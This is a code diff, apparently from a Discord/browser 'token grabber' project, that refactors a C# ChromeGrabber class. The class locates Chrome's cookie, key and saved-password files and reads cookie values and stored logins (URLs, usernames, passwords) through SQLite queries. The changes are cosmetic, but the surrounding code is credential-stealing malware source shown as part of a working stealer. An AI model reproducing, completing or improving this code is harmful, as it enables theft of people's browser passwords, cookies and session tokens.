@@ -16,30 +16,13 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
 {
     class ChromeGrabber
     {
-        public string ChromeCookiePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\Google\Chrome\User Data\Default\Cookies";
-        public string ChromeKeyPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\Google\Chrome\User Data\Local State";
-        public string ChromePasswordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\Google\Chrome\User Data\Default\Login Data";
+        public string ChromeCookiePath = $@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Google\Chrome\User Data\Default\Cookies", ChromeKeyPath = $@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Google\Chrome\User Data\Local State", ChromePasswordPath = $@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Google\Chrome\User Data\Default\Login Data";
 
-        public bool CookiesExists()
-        {
-            if (File.Exists(ChromeCookiePath))
-                return true;
-            return false;
-        }
+        public bool CookiesExists() => File.Exists(ChromeCookiePath);
 
-        public bool PasswordsExists()
-        {
-            if (File.Exists(ChromePasswordPath))
-                return true;
-            return false;
-        }
+        public bool PasswordsExists() => File.Exists(ChromePasswordPath);
 
-        public bool KeyExists()
-        {
-            if (File.Exists(ChromeKeyPath))
-                return true;
-            return false;
-        }
+        public bool KeyExists() => File.Exists(ChromeKeyPath);
 
         public List<Cookie> GetCookiesByHostname(string hostName, byte[] key)
         {
@@ -79,7 +62,7 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={ChromeCookiePath};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies";
+                    cmd.CommandText = "SELECT name,encrypted_value,host_key FROM cookies";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
@@ -139,7 +122,7 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={ChromePasswordPath};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"SELECT origin_url,username_value,password_value FROM logins";
+                    cmd.CommandText = "SELECT origin_url,username_value,password_value FROM logins";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
